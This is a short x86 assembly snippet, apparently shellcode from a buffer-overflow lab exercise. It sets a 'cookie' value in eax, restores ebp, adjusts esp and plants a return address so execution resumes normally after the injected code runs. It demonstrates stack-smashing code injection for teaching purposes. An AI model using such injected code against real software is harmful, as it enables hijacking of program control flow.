mov $0x238d4669, %eax # move cookie value to eax
mov $0x55685ff0, %ebp # restore ebp
mov $0x55682f04, %esp # move esp so that is returns to ifself upon ret
movl $0x8048f15, 0x55682f04 #copy return address to memory
ret
